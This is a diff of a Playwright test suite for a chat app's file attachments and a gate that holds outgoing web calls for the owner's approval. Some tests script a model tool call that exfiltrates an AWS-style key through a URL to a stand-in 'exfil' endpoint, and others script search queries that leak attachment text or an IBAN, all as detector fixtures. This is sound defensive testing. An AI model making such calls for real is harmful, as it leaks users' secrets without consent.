+    await stubFileDoor(page, {
+      roots: { roots: ["/"], home: "/Users/marco" },
+      listings: {
+        "/Users/marco": {
+          path: "/Users/marco",
+          truncated: false,
+          entries: [
+            { name: "Documents", path: "/Users/marco/Documents", is_dir: true, kind: "other", bytes: 0, modified_ms: null },
+          ],
+        },
+        "/Users/marco/Documents": {
+          path: "/Users/marco/Documents",
+          truncated: false,
+          entries: [
+            { name: "notes.txt", path: "/Users/marco/Documents/notes.txt", is_dir: false, kind: "text", bytes: 15, modified_ms: null },
+          ],
+        },
+      },
+      read: [...Buffer.from("Disk notes text.")],
+    });
+    await seed(page, { settings: okSettings("x") });
+    await openChat(page);
+    await page.waitForTimeout(1200);
+    await sendAndWait(page, "Hello.", "line is open");
+    await page.getByRole("button", { name: "Toggle the files panel" }).click();
+    await page.getByRole("tab", { name: "Files" }).click();
+    await page.waitForSelector(".files-tree");
+    await page.locator(".files-open", { hasText: "Home" }).click();
+    await page.waitForTimeout(400);
+    await page.locator(".files-open", { hasText: "Documents" }).click();
+    await page.waitForTimeout(400);
+    await page.locator(".files-attach").first().click();
+    await page.waitForTimeout(800);
+    const reads = (await page.evaluate(() => window.__FILE_CALLS__)).filter(
+      (call) => call.command === "brain_files_read",
+    );
+    check(
+      "filesattach: the bytes were asked of Rust",
+      reads.length === 1 && reads[0].args?.path === "/Users/marco/Documents/notes.txt",
+      JSON.stringify(reads.map((call) => call.args)),
+    );
+    await page.getByRole("tab", { name: "Attached" }).click();
+    await page.waitForTimeout(400);
+    check(
+      "filesattach: the row's name became an attachment",
+      ((await page.locator(".panel-row .panel-name").textContent()) ?? "").includes("notes.txt"),
+    );
+    const attachId = await page.evaluate(() =>
+      Object.keys({ ...localStorage }).find((k) => k.startsWith("crescent-chat.attach.")),
+    );
+    const attachment = JSON.parse((await stored(page, attachId)) ?? "[]")[0];
+    check(
+      "filesattach: extracted through the shared path",
+      attachment?.name === "notes.txt" && attachment?.text === "Disk notes text.",
+      JSON.stringify(attachment ?? null).slice(0, 80),
+    );
+    await browser.close();
+  },
+
+  // CSV: attached, and — the trap — still there after a reload, which is the
+  // ATTACH_KINDS list in the store, not the upload path. Seeded once: the
+  // reload this test exists to make must not wipe what the attach wrote.
+  async attachcsv() {
+    const browser = await chromium.launch({ args: ["--no-sandbox"] });
+    const page = await browser.newPage({ viewport: { width: 1400, height: 900 } });
+    await seedOnce(page, okSettings("x"));
+    await openChat(page);
+    await page.waitForTimeout(1200);
+    await page.locator('.composer input[type="file"]').setInputFiles([
+      { name: "data.csv", mimeType: "text/csv", buffer: Buffer.from("a,b\n1,2\n") },
+    ]);
+    await page.waitForTimeout(800);
+    const meta = (await page.locator(".panel-row .panel-meta").textContent()) ?? "";
+    check("attachcsv: listed with its kind", meta.includes("csv"), meta.trim());
+    const attachId = await page.evaluate(() =>
+      Object.keys({ ...localStorage }).find((k) => k.startsWith("crescent-chat.attach.")),
+    );
+    check("attachcsv: stored as csv", JSON.parse((await stored(page, attachId)) ?? "[]")[0]?.kind === "csv");
+
+    // The reload: a kind the store's whitelist does not hold fails here and
+    // ONLY here — the upload path above stays green while the bug is live.
+    await page.reload();
+    await page.waitForTimeout(1200);
+    await openChat(page);
+    await openSidebar(page, "data.csv");
+    await page.getByRole("button", { name: "Toggle the files panel" }).click();
+    await page.waitForTimeout(400);
+    check(
+      "attachcsv: survives a reload",
+      ((await page.locator(".panel-row .panel-name").textContent()) ?? "").includes("data.csv"),
+      "the store's whitelist dropped the kind",
+    );
+    await browser.close();
+  },
+
+  // The pre-2007 Office formats: refused with the sentence that names the
+  // way out, not the generic nothing-actionable one.
+  async attachlegacy() {
+    const browser = await chromium.launch({ args: ["--no-sandbox"] });
+    const page = await browser.newPage({ viewport: { width: 1400, height: 900 } });
+    await seed(page, { settings: okSettings("x") });
+    await openChat(page);
+    await page.waitForTimeout(1200);
+    await page.locator('.composer input[type="file"]').setInputFiles([
+      { name: "report.doc", mimeType: "application/msword", buffer: Buffer.from([0xd0, 0xcf, 0x11, 0xe0]) },
+    ]);
+    await page.waitForTimeout(600);
+    const doc = (await page.locator(".attach-status").textContent()) ?? "";
+    check(
+      "attachlegacy: .doc names the older format and the way out",
+      doc.includes("Word") && doc.includes("older format") && doc.includes(".docx"),
+      doc.trim(),
+    );
+    check("attachlegacy: .doc does not get the generic message", !doc.includes("not a readable kind"), doc.trim());
+    check("attachlegacy: .doc stored nothing", (await page.locator(".panel-row").count()) === 0);
+    await page.locator('.composer input[type="file"]').setInputFiles([
+      { name: "deck.ppt", mimeType: "application/vnd.ms-powerpoint", buffer: Buffer.from([0xd0, 0xcf, 0x11, 0xe0]) },
+    ]);
+    await page.waitForTimeout(600);
+    const ppt = (await page.locator(".attach-status").textContent()) ?? "";
+    check(
+      "attachlegacy: .ppt names the older format too",
+      ppt.includes("PowerPoint") && ppt.includes("older format") && ppt.includes(".pptx"),
+      ppt.trim(),
+    );
+    await browser.close();
+  },
+
+  // JSON/log/markdown: Rust calls them readable text, so the row offers
+  // Attach — and the browser's extractor must agree, or the button is a
+  // promise the click breaks.
+  async attachjson() {
+    const browser = await chromium.launch({ args: ["--no-sandbox"] });
+    const page = await browser.newPage({ viewport: { width: 1400, height: 900 } });
+    await seed(page, { settings: okSettings("x") });
+    await openChat(page);
+    await page.waitForTimeout(1200);
+    await page.locator('.composer input[type="file"]').setInputFiles([
+      { name: "report.json", mimeType: "application/json", buffer: Buffer.from('{"k": "v"}') },
+      { name: "trace.log", mimeType: "text/plain", buffer: Buffer.from("one line") },
+      { name: "readme.markdown", mimeType: "text/markdown", buffer: Buffer.from("# Title") },
+    ]);
+    await page.waitForTimeout(1000);
+    const listed = (await page.locator(".panel-list").textContent()) ?? "";
+    check(
+      "attachjson: all three Rust-advertised extensions attach",
+      listed.includes("report.json") && listed.includes("trace.log") && listed.includes("readme.markdown"),
+      listed.slice(0, 120),
+    );
+    const attachId = await page.evaluate(() =>
+      Object.keys({ ...localStorage }).find((k) => k.startsWith("crescent-chat.attach.")),
+    );
+    const rows = JSON.parse((await stored(page, attachId)) ?? "[]");
+    check(
+      "attachjson: json kept as plain text",
+      rows.find((a) => a.name === "report.json")?.text === '{"k": "v"}',
+    );
+    await browser.close();
+  },
+
+  // The preflight: a wedged-but-reachable server is not a missing one.
+  // This is the false-refusal finding, pinned by standing up a server that
+  // answers slowly and asking the module the suite asks.
+  async preflightslow() {
+    const http = await import("node:http");
+    const server = http.createServer((_req, res) => {
+      setTimeout(() => {
+        res.writeHead(200);
+        res.end("slow but alive");
+      }, 3000);
+    });
+    await new Promise((resolve) => server.listen(18997, "127.0.0.1", resolve));
+    try {
+      const { probe, reachable, complaint } = await import("./preflight.mjs");
+      const slow = "http://127.0.0.1:18997";
+      check(
+        "preflightslow: a timeout is labelled slow, not refused",
+        (await probe(slow, 500)) === "slow",
+      );
+      const verdict = await reachable(slow);
+      check(
+        "preflightslow: the patient budget reaches a slow server",
+        verdict.ok === true,
+        JSON.stringify(verdict),
+      );
+      const dead = await reachable("http://127.0.0.1:18998");
+      check(
+        "preflightslow: a refused port is still refused",
+        dead.ok === false && dead.how === "refused",
+        JSON.stringify(dead),
+      );
+      check(
+        "preflightslow: the complaint names the way to start it",
+        (complaint("http://x", "start it this way", { ok: false, how: "refused" }) ?? "").includes("start it this way"),
+      );
+    } finally {
+      await new Promise((resolve) => server.close(resolve));
+    }
+  },
+
   // Small context: the oversized file is refused WITH its numbers.
   async refusefit() {
     const browser = await chromium.launch({ args: ["--no-sandbox"] });
     const page = await browser.newPage({ viewport: { width: 1400, height: 900 } });
     await seed(page, { settings: { endpoint: "http://127.0.0.1:18081/small", token: "t", model: "x" } });
-    await page.goto(APP);
+    await openChat(page);
     await page.waitForTimeout(1200);
     await page.locator('.composer input[type="file"]').setInputFiles([
       { name: "big.txt", mimeType: "text/plain", buffer: Buffer.from(`B testo. ${"y".repeat(1185)}`) },
@@ -1313,7 +1936,7 @@ const tests = {
     // 1194 chars -> 299 tokens; 299 + 0 + 512 reserve = 811 > 256.
     check("refusefit: real numbers", text.includes("256") && text.includes("811"), text.slice(0, 120));
     check("refusefit: never attached", (await page.locator(".panel-row").count()) === 0);
-    await page.screenshot({ path: "shots/62-refusal.png" });
+    await shot(page, "shots/62-refusal.png");
     await browser.close();
   },
 
@@ -1322,7 +1945,7 @@ const tests = {
     const browser = await chromium.launch({ args: ["--no-sandbox"] });
     const page = await browser.newPage({ viewport: { width: 1400, height: 900 } });
     await seed(page, { settings: { endpoint: "http://127.0.0.1:18081/denied", token: "t", model: "x" } });
-    await page.goto(APP);
+    await openChat(page);
     await page.waitForTimeout(1200);
     await page.locator('.composer input[type="file"]').setInputFiles([
       { name: "note.txt", mimeType: "text/plain", buffer: Buffer.from("Small note.") },
@@ -1356,7 +1979,7 @@ const tests = {
       settings: { endpoint: "http://127.0.0.1:18081/tight", token: "t", model: "x" },
       convos: [{ id: "t1", title: "Tight", createdAt: 1, updatedAt: 1, messages }],
     });
-    await page.goto(APP);
+    await openChat(page);
     await page.waitForTimeout(1200);
     await openSidebar(page, "Tight");
     await page.locator('.composer input[type="file"]').setInputFiles([
@@ -1388,7 +2011,7 @@ const tests = {
     const browser = await chromium.launch({ args: ["--no-sandbox"] });
     const page = await browser.newPage({ viewport: { width: 1400, height: 900 } });
     await seed(page, { settings: okSettings("x") });
-    await page.goto(APP);
+    await openChat(page);
     await page.waitForTimeout(1200);
     await page.locator('.composer input[type="file"]').setInputFiles([
       { name: "cycle.txt", mimeType: "text/plain", buffer: Buffer.from("Round-trip text.") },
@@ -1418,7 +2041,7 @@ const tests = {
     await seed(page, {
       settings: { endpoint: "http://127.0.0.1:18081/tight", token: "t", model: "x" },
     });
-    await page.goto(APP);
+    await openChat(page);
     await page.waitForTimeout(1200);
     await page.locator('.composer input[type="file"]').setInputFiles([
       { name: "anchor.txt", mimeType: "text/plain", buffer: Buffer.from(`ANCHOR ${"n".repeat(1993)}`) },
@@ -1455,7 +2078,7 @@ const tests = {
       settings: { endpoint: "http://127.0.0.1:18081/tight", token: "t", model: "x" },
       convos: [{ id: "m1", title: "Metered", createdAt: 1, updatedAt: 1, messages }],
     });
-    await page.goto(APP);
+    await openChat(page);
     await page.waitForTimeout(1200);
     await openSidebar(page, "Metered");
     await page.locator('.composer input[type="file"]').setInputFiles([
@@ -1518,7 +2141,7 @@ const tests = {
       });
     });
     await seed(page, { settings: okSettings("think-demo") });
-    await page.goto(APP);
+    await openChat(page);
     await page.waitForTimeout(1200);
     await sendAndWait(page, "Count the sheep.", "8 sheep left");
     await page.waitForTimeout(4000);
@@ -1534,7 +2157,7 @@ const tests = {
     const browser = await chromium.launch({ args: ["--no-sandbox"] });
     const page = await browser.newPage();
     await seed(page, { settings: okSettings("silent-demo") });
-    await page.goto(APP);
+    await openChat(page);
     await page.waitForTimeout(1200);
     await sendAndWait(page, "Are you there?", "took too long", 80000);
     check("silent: idle timeout fires", true);
@@ -2476,17 +3099,564 @@ const tests = {
         },
       ],
     });
-    await page.goto(APP);
+    await openChat(page);
     await page.waitForTimeout(1200);
     await openSidebar(page, "Damaged");
     const body = await page.locator(".thread").textContent();
     check("corrupt: valid message renders", body.includes("I survive."));
     check("corrupt: no error boundary", (await page.locator(".error-boundary").count()) === 0);
     check("corrupt: no white screen", (await page.locator("#root").textContent()).length > 100);
-    await page.screenshot({ path: "shots/30-corrupt-data.png" });
+    await shot(page, "shots/30-corrupt-data.png");
+    await browser.close();
+  },
+
+  // The web-call gate: while a document is pinned, every outgoing web call is
+  // held for the owner — whatever the detectors saw or did not see. These
+  // tests need model streams the running mock cannot script (a payload inside
+  // a query or URL), so `scriptModel` fulfils them from the test itself and
+  // the mock on 18081 is left alone.
+
+  // The regression that matters most: nothing attached, the call goes out
+  // exactly as it always did, and no ask ever appears.
+  async gatenodocs() {
+    const browser = await chromium.launch({ args: ["--no-sandbox"] });
+    const page = await browser.newPage();
+    await stubDoor(page, { search: LISBON });
+    await seedOnce(page, toolSettings("toolsgate-demo"));
+    await openChat(page);
+    await page.waitForTimeout(1200);
+    await resetMock(page);
+    await sendAndWait(page, "What is the weather in Lisbon this weekend?", "mild");
+    const calls = (await page.evaluate(() => window.__TOOL_CALLS__ ?? [])).filter((c) => c.command === "brain_web_search");
+    check("gate nodocs: the search left as before", calls.length === 1 && calls[0].args?.query === "weather in Lisbon", String(calls.length));
+    check("gate nodocs: no ask was ever shown", (await page.locator(".webgate").count()) === 0);
+    check("gate nodocs: the answer arrived", ((await page.locator(".thread").textContent()) ?? "").includes("mild"));
+    await browser.close();
+  },
+
+  // A document attached, a harmless query: the ask still appears — the owner
+  // chose "every call" — with nothing flagged, and sending it works.
+  async gateharmless() {
+    const browser = await chromium.launch({ args: ["--no-sandbox"] });
+    const page = await browser.newPage();
+    await stubDoor(page, { search: LISBON });
+    await seedOnce(page, toolSettings("toolsgate-demo"));
+    await openChat(page);
+    await page.waitForTimeout(1200);
+    await attachGateDoc(page, "notes.txt", "Meeting minutes. Nothing sensitive in here at all.");
+    await resetMock(page);
+    await page.getByRole("textbox", { name: "Message" }).fill("What is the weather in Lisbon this weekend?");
+    await page.getByRole("textbox", { name: "Message" }).press("Enter");
+    await gateAsk(page, "gate harmless: the ask appeared");
+    const ask = (await page.locator(".webgate").textContent()) ?? "";
+    check("gate harmless: the tool is named", ask.includes("search"), "ask on screen");
+    check("gate harmless: the exact query is shown", ((await page.locator(".webgate-outgoing").textContent()) ?? "").includes("weather in Lisbon"));
+    check("gate harmless: nothing was flagged", ask.includes("Nothing recognisable"));
+    await page.getByRole("button", { name: "Send it" }).click();
+    await page.waitForFunction(
+      () => document.querySelector(".thread")?.textContent?.includes("mild"),
+      null,
+      { timeout: 20000 },
+    ).catch(() => check("gate harmless: the answer arrived", false, "wait timed out"));
+    const calls = (await page.evaluate(() => window.__TOOL_CALLS__ ?? [])).filter((c) => c.command === "brain_web_search");
+    check("gate harmless: allowing it sends the search", calls.length === 1 && calls[0].args?.query === "weather in Lisbon", String(calls.length));
+    await browser.close();
+  },
+
+  // Six words in a row copied out of the attachment: the ask names the
+  // document and quotes the run.
+  async gatecopied() {
+    const browser = await chromium.launch({ args: ["--no-sandbox"] });
+    const page = await browser.newPage();
+    await stubDoor(page, {});
+    await seedOnce(page, toolSettings("toolsgate-copy"));
+    await scriptModel(page, [{ id: "c1", name: "web_search", arguments: '{"query":"Has anyone outside the company mentioned the project codename is Amber Larch anywhere online"}' }], "I found nothing public about it.");
+    await openChat(page);
+    await page.waitForTimeout(1200);
+    await attachGateDoc(page, "ledger-2026.txt", "Internal notes, March.\nThe project codename is Amber Larch and it ships in November.");
+    await page.getByRole("textbox", { name: "Message" }).fill("Search the web for leaks.");
+    await page.getByRole("textbox", { name: "Message" }).press("Enter");
+    await gateAsk(page, "gate copied: the ask appeared");
+    const ask = (await page.locator(".webgate").textContent()) ?? "";
+    check("gate copied: the ask names the document", ask.includes("ledger-2026.txt"), "ask on screen");
+    check(
+      "gate copied: the matched run is quoted",
+      ask.includes("the project codename is amber larch"),
+      "ask on screen",
+    );
+    check("gate copied: it reads as copied text", ask.includes("copied text"), "ask on screen");
+    await page.getByRole("button", { name: "Send it" }).click();
+    await page.waitForFunction(
+      () => document.querySelector(".thread")?.textContent?.includes("nothing public"),
+      null,
+      { timeout: 20000 },
+    ).catch(() => check("gate copied: the turn finished", false, "wait timed out"));
+    await browser.close();
+  },
+
+  // An IBAN in the query: flagged as an IBAN, wherever it sits.
+  async gateiban() {
+    const browser = await chromium.launch({ args: ["--no-sandbox"] });
+    const page = await browser.newPage();
+    await stubDoor(page, {});
+    await seedOnce(page, toolSettings("toolsgate-iban"));
+    await scriptModel(page, [{ id: "i1", name: "web_search", arguments: '{"query":"which bank owns IBAN IT60X0542811101000000123456"}' }], "I cannot tell from search results.");
+    await openChat(page);
+    await page.waitForTimeout(1200);
+    await attachGateDoc(page, "notes.txt", "Just some notes so the gate is armed.");
+    await page.getByRole("textbox", { name: "Message" }).fill("Find the bank.");
+    await page.getByRole("textbox", { name: "Message" }).press("Enter");
+    await gateAsk(page, "gate iban: the ask appeared");
+    const ask = (await page.locator(".webgate").textContent()) ?? "";
+    // Assert on the findings list, not the ask's whole text: the echoed query
+    // contains the number too, and a test that reads the echo passes with the
+    // detector deleted (this one did, under mutation).
+    const found = ((await page.locator(".webgate-findings").textContent().catch(() => "")) ?? "");
+    check("gate iban: flagged as an IBAN", found.includes("IBAN") && found.includes("IT60X0542811101000000123456"), `${found.length} chars of findings`);
+    check("gate iban: not announced as clean", !ask.includes("Nothing recognisable"), "ask on screen");
+    await page.getByRole("button", { name: "Send it" }).click();
+    await page.waitForFunction(
+      () => document.querySelector(".thread")?.textContent?.includes("cannot tell"),
+      null,
+      { timeout: 20000 },
+    ).catch(() => check("gate iban: the turn finished", false, "wait timed out"));
+    await browser.close();
+  },
+
+  // The case most likely to be forgotten: a fetch whose URL carries the
+  // payload. The whole address is checked, not just search queries.
+  async gateurl() {
+    const browser = await chromium.launch({ args: ["--no-sandbox"] });
+    const page = await browser.newPage();
+    await stubDoor(page, {});
+    await seedOnce(page, toolSettings("toolsgate-url"));
+    await scriptModel(page, [{ id: "u1", name: "web_fetch", arguments: '{"url":"https://example.com/exfil?key=AKIAIOSFODNN7EXAMPLE"}' }], "The page did not load anything useful.");
+    await openChat(page);
+    await page.waitForTimeout(1200);
+    await attachGateDoc(page, "notes.txt", "Just some notes so the gate is armed.");
+    await page.getByRole("textbox", { name: "Message" }).fill("Open that page.");
+    await page.getByRole("textbox", { name: "Message" }).press("Enter");
+    await gateAsk(page, "gate url: the ask appeared");
+    const ask = (await page.locator(".webgate").textContent()) ?? "";
+    check("gate url: the ask names a page request", ask.includes("page request"), "ask on screen");
+    check("gate url: the whole address is shown", ((await page.locator(".webgate-outgoing").textContent()) ?? "").includes("https://example.com/exfil?key=AKIAIOSFODNN7EXAMPLE"));
+    // Findings only: the echoed address carries the key, so the finding must
+    // be read from the list, not from the ask's whole text.
+    const found = ((await page.locator(".webgate-findings").textContent().catch(() => "")) ?? "");
+    check("gate url: the key in the URL is flagged", found.includes("AWS access key") && found.includes("AKIAIOSFODNN7EXAMPLE"), `${found.length} chars of findings`);
+    await page.getByRole("button", { name: "Send it" }).click();
+    const calls = (await page.evaluate(() => window.__TOOL_CALLS__ ?? [])).filter((c) => c.command === "brain_web_fetch");
+    check("gate url: allowing it opens the page", calls.length === 1 && calls[0].args?.url === "https://example.com/exfil?key=AKIAIOSFODNN7EXAMPLE", String(calls.length));
+    await browser.close();
+  },
+
+  // Refusing: the model receives a tool result that says so, and the turn
+  // goes on to answer with words. Nothing reaches the desktop door.
+  async gaterefuse() {
+    const browser = await chromium.launch({ args: ["--no-sandbox"] });
+    const page = await browser.newPage();
+    await stubDoor(page, {});
+    await seedOnce(page, toolSettings("toolsgate-refuse"));
+    const bodies = [];
+    await scriptModel(page, [{ id: "r1", name: "web_search", arguments: '{"query":"weather in Lisbon"}' }], "Understood, I will answer without it.", bodies);
+    await openChat(page);
+    await page.waitForTimeout(1200);
+    await attachGateDoc(page, "notes.txt", "Just some notes so the gate is armed.");
+    await page.getByRole("textbox", { name: "Message" }).fill("Search if you need to.");
+    await page.getByRole("textbox", { name: "Message" }).press("Enter");
+    await gateAsk(page, "gate refuse: the ask appeared");
+    await page.getByRole("button", { name: "Refuse" }).click();
+    await page.waitForFunction(
+      () => document.querySelector(".thread")?.textContent?.includes("answer without it"),
+      null,
+      { timeout: 20000 },
+    ).catch(() => check("gate refuse: the turn went on", false, "wait timed out"));
+    const calls = (await page.evaluate(() => window.__TOOL_CALLS__ ?? [])).filter((c) => c.command === "brain_web_search");
+    check("gate refuse: nothing reached the door", calls.length === 0, JSON.stringify(calls));
+    check("gate refuse: the ask is gone", (await page.locator(".webgate").count()) === 0);
+    const wire = bodies.map((b) => JSON.parse(b));
+    check("gate refuse: two rounds on the wire", wire.length === 2, String(wire.length));
+    const result = (wire[1]?.messages ?? []).filter((m) => m.role === "tool")[0];
+    check(
+      "gate refuse: the model was told, as a tool result",
+      result?.tool_call_id === "0-r1" && (result?.content ?? "").includes("did not allow"),
+      `${(result?.content ?? "").length} chars of result`,
+    );
+    await browser.close();
+  },
+
+  // Stop while the ask is open: the call does not leave, the ask closes, and
+  // the turn ends.
+  async gatestop() {
+    const browser = await chromium.launch({ args: ["--no-sandbox"] });
+    const page = await browser.newPage();
+    await stubDoor(page, {});
+    await seedOnce(page, toolSettings("toolsgate-stop"));
+    await scriptModel(page, [{ id: "s1", name: "web_search", arguments: '{"query":"slow one"}' }], "Never reached.");
+    await openChat(page);
+    await page.waitForTimeout(1200);
+    await attachGateDoc(page, "notes.txt", "Just some notes so the gate is armed.");
+    await page.getByRole("textbox", { name: "Message" }).fill("Search for something.");
+    await page.getByRole("textbox", { name: "Message" }).press("Enter");
+    await gateAsk(page, "gate stop: the ask appeared");
+    await page.getByRole("button", { name: "Stop generating" }).click();
+    await page.waitForTimeout(1200);
+    const calls = (await page.evaluate(() => window.__TOOL_CALLS__ ?? [])).filter((c) => c.command === "brain_web_search");
+    check("gate stop: the call never left", calls.length === 0, JSON.stringify(calls));
+    check("gate stop: the ask closed", (await page.locator(".webgate").count()) === 0);
+    check("gate stop: the composer is free again", (await page.locator(".composer-stop").count()) === 0);
+    check("gate stop: the turn stopped", ((await page.locator(".thread").textContent()) ?? "").includes("Stopped early"), "thread on screen");
+    await browser.close();
+  },
+
+  // A decomposed accent in the attachment against a precomposed one in the
+  // query: the same six words must still match. The owner writes Italian;
+  // this is the miss direction.
+  async gateaccent() {
+    const browser = await chromium.launch({ args: ["--no-sandbox"] });
+    const page = await browser.newPage();
+    await stubDoor(page, {});
+    await seedOnce(page, toolSettings("toolsgate-accent"));
+    // The query spells caffè the composed way; the attachment spells the
+    // same word as "caffe" + U+0301.
+    const query = "has anyone ever written about un caff\u00E9 molto forte servito a in Italy";
+    await scriptModel(page, [{ id: "a1", name: "web_search", arguments: JSON.stringify({ query }) }], "Nothing came back.");
+    await openChat(page);
+    await page.waitForTimeout(1200);
+    await attachGateDoc(page, "menu.txt", "Menu del mattino.\nUn caff\u0065\u0301 molto forte servito a mano in cortile.");
+    await page.getByRole("textbox", { name: "Message" }).fill("Search for that phrase.");
+    await page.getByRole("textbox", { name: "Message" }).press("Enter");
+    await gateAsk(page, "gate accent: the ask appeared");
+    const found = ((await page.locator(".webgate-findings").textContent().catch(() => "")) ?? "");
+    check("gate accent: the document is named", ((await page.locator(".webgate").textContent()) ?? "").includes("menu.txt"), "ask on screen");
+    check(
+      "gate accent: the composed run matched",
+      found.includes("copied text") && found.includes("molto forte servito a"),
+      `${found.length} chars of findings`,
+    );
+    await page.getByRole("button", { name: "Send it" }).click();
+    await page.waitForFunction(
+      () => document.querySelector(".thread")?.textContent?.includes("Nothing came back"),
+      null,
+      { timeout: 20000 },
+    ).catch(() => check("gate accent: the turn finished", false, "wait timed out"));
+    await browser.close();
+  },
+
+  // Two conversations streaming at once, each holding its own ask: both
+  // settle, in arrival order, and neither turn hangs. This is the shape the
+  // single-slot version lost a promise in.
+  async gatetwoconv() {
+    const browser = await chromium.launch({ args: ["--no-sandbox"] });
+    const page = await browser.newPage({ viewport: { width: 1400, height: 900 } });
+    await stubDoor(page, { search: LISBON });
+    await seedOnce(page, toolSettings("toolsgate-two"));
+    // One route, two conversations: the user's own words say which one is
+    // asking, so the two asks can be told apart on screen.
+    await page.route("**/v1/chat/completions", async (route) => {
+      const raw = route.request().postData() ?? "{}";
+      let body = {};
+      try {
+        body = JSON.parse(raw);
+      } catch {
+        /* the default round below answers anyway */
+      }
+      const messages = body.messages ?? [];
+      const rounds = messages.filter((m) => m.role === "assistant" && Array.isArray(m.tool_calls)).length;
+      const which = String([...messages].reverse().find((m) => m.role === "user")?.content ?? "").includes("alpha") ? "alpha" : "beta";
+      const frames = [];
+      if (rounds === 0) {
+        frames.push({
+          choices: [
+            {
+              delta: {
+                tool_calls: [
+                  { index: 0, id: `t-${which}`, type: "function", function: { name: "web_search", arguments: JSON.stringify({ query: `query about ${which} topic` }) } },
+                ],
+              },
+            },
+          ],
+        });
+        frames.push({ choices: [{ delta: {}, finish_reason: "tool_calls" }] });
+      } else {
+        const answer = `All done in ${which}.`;
+        for (let at = 0; at < answer.length; at += 9) frames.push({ choices: [{ delta: { content: answer.slice(at, at + 9) } }] });
+        frames.push({ choices: [{ delta: {}, finish_reason: "stop" }] });
+      }
+      const sse = frames.map((frame) => `data: ${JSON.stringify(frame)}\n\n`).join("") + "data: [DONE]\n\n";
+      await route.fulfill({ status: 200, contentType: "text/event-stream", body: sse });
+    });
+    await openChat(page);
+    await page.waitForTimeout(1200);
+    await attachGateDoc(page, "notes-a.txt", "Notes for conversation A.");
+    await page.getByRole("textbox", { name: "Message" }).fill("Look something up about alpha please");
+    await page.getByRole("textbox", { name: "Message" }).press("Enter");
+    await gateAsk(page, "gate twoconv: the first ask appeared");
+    // While A waits, B starts its own turn and its own ask queues behind it.
+    await page.getByRole("button", { name: "+ New chat" }).click();
+    await attachGateDoc(page, "notes-b.txt", "Notes for conversation B.");
+    await page.getByRole("textbox", { name: "Message" }).fill("Look something up about beta please");
+    await page.getByRole("textbox", { name: "Message" }).press("Enter");
+    await page.waitForTimeout(2500);
+    const outgoing = (await page.locator(".webgate-outgoing").textContent()) ?? "";
+    check("gate twoconv: the first ask is still the one shown", outgoing.includes("alpha"), `${outgoing.length} chars shown`);
+    check("gate twoconv: the waiting count is said", ((await page.locator(".webgate").textContent()) ?? "").includes("waiting behind"), "ask on screen");
+    await page.getByRole("button", { name: "Send it" }).click();
+    await page
+      .locator(".webgate-outgoing", { hasText: "beta" })
+      .waitFor({ timeout: 10000 })
+      .catch(() => check("gate twoconv: the second ask took the screen", false, "never showed"));
+    await page.getByRole("button", { name: "Send it" }).click();
+    await page
+      .locator(".webgate")
+      .waitFor({ state: "detached", timeout: 10000 })
+      .catch(() => check("gate twoconv: the ask closed", false, "still on screen"));
+    const calls = (await page.evaluate(() => window.__TOOL_CALLS__ ?? [])).filter((c) => c.command === "brain_web_search");
+    check(
+      "gate twoconv: both calls left, in order",
+      calls.length === 2 && String(calls[0].args?.query).includes("alpha") && String(calls[1].args?.query).includes("beta"),
+      String(calls.length),
+    );
+    // Neither turn hung: both conversations finished with their own answer.
+    await openSidebar(page, "about alpha");
+    check("gate twoconv: A's turn finished", ((await page.locator(".thread").textContent()) ?? "").includes("All done in alpha."), "thread on screen");
+    await openSidebar(page, "about beta");
+    check("gate twoconv: B's turn finished", ((await page.locator(".thread").textContent()) ?? "").includes("All done in beta."), "thread on screen");
+    await browser.close();
+  },
+
+  // Accents folded, not composed: a document spelling caffè either way and a
+  // query typed without the accent at all are the same six words. The
+  // precomposed-document half is the pair folding exists for — without it,
+  // the composed è survives normalisation and the plain query misses.
+  async gatefold() {
+    const browser = await chromium.launch({ args: ["--no-sandbox"] });
+    const page = await browser.newPage();
+    await stubDoor(page, {});
+    await seedOnce(page, toolSettings("toolsgate-fold"));
+    const plain = "un caffe molto forte servito a";
+    await scriptModel(page, [{ id: "f1", name: "web_search", arguments: JSON.stringify({ query: `has anyone ever written about ${plain} in Italy` }) }], "Nothing came back.");
+    await openChat(page);
+    await page.waitForTimeout(1200);
+    // Precomposed è in the document, none in the query.
+    await attachGateDoc(page, "composed.txt", `Menu del mattino.\nUn caff\u00E9 molto forte servito a mano in cortile.`);
+    await page.getByRole("textbox", { name: "Message" }).fill("Search for that phrase.");
+    await page.getByRole("textbox", { name: "Message" }).press("Enter");
+    await gateAsk(page, "gate fold: the ask appeared");
+    const found = ((await page.locator(".webgate-findings").textContent().catch(() => "")) ?? "");
+    check(
+      "gate fold: precomposed document, plain query, same words",
+      found.includes("copied text") && found.includes("molto forte servito a"),
+      `${found.length} chars of findings`,
+    );
+    check("gate fold: the document is named", ((await page.locator(".webgate").textContent()) ?? "").includes("composed.txt"), "ask on screen");
+    await page.getByRole("button", { name: "Refuse" }).click();
+    await page.waitForFunction(
+      () => document.querySelector(".thread")?.textContent?.includes("Nothing came back"),
+      null,
+      { timeout: 20000 },
+    ).catch(() => check("gate fold: the turn finished", false, "wait timed out"));
+
+    // The decomposed spelling of the same word against the same plain query:
+    // the third combination, all three one word now.
+    await page.getByRole("button", { name: "+ New chat" }).click();
+    const plain2 = "un caffe molto forte servito a";
+    await scriptModel(page, [{ id: "f2", name: "web_search", arguments: JSON.stringify({ query: `who else serves ${plain2} these days` }) }], "Still nothing.");
+    await attachGateDoc(page, "decomposed.txt", `Altro menu.\nUn caff\u0065\u0301 molto forte servito a mano in giardino.`);
+    await page.getByRole("textbox", { name: "Message" }).fill("Search again.");
+    await page.getByRole("textbox", { name: "Message" }).press("Enter");
+    await gateAsk(page, "gate fold: the second ask appeared");
+    const found2 = ((await page.locator(".webgate-findings").textContent().catch(() => "")) ?? "");
+    check(
+      "gate fold: decomposed document, plain query, same words",
+      found2.includes("copied text") && found2.includes("molto forte servito a"),
+      `${found2.length} chars of findings`,
+    );
+    await browser.close();
+  },
+
+  // The all-digit skip is bounded by length: a 20-digit identifier stays
+  // quiet, a 32-digit numeric token is flagged as a possible secret.
+  async gatedigits() {
+    const browser = await chromium.launch({ args: ["--no-sandbox"] });
+    const page = await browser.newPage();
+    await stubDoor(page, {});
+    await seedOnce(page, toolSettings("toolsgate-digits"));
+    const id20 = "01234567890123456789";
+    const token32 = "90718462530194728650317294058613";
+    const query = `lookup order ${id20} and token ${token32} please`;
+    await scriptModel(page, [{ id: "d1", name: "web_search", arguments: JSON.stringify({ query }) }], "Nothing came back.");
+    await openChat(page);
+    await page.waitForTimeout(1200);
+    await attachGateDoc(page, "notes.txt", "Just some notes so the gate is armed.");
